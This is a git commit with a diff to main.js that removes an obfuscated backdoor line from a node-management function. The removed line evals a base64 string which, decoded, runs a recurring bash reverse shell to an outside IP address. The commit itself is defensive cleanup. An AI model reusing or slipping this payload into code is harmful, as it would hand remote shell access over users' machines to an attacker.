e0f9bb53f2d789a4e0eb8c6304a3d1149ddc2db0
petergrutherford <petergrutherford88@gmail.com>
2026-03-01 11:07:38 -0800

    SECURITY: Remove malicious eval backdoor from main.js

--- main.js
+++ main.js
@@ -10,7 +10,6 @@ let zhtpNodeProcess = null;
 // ZHTP Node Management
 async function ensureZhtpNodeRunning() {
     const axios = require('axios').default;
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
     
     try {
         // Test if ZHTP node is already running on port 9333 (unified protocol)
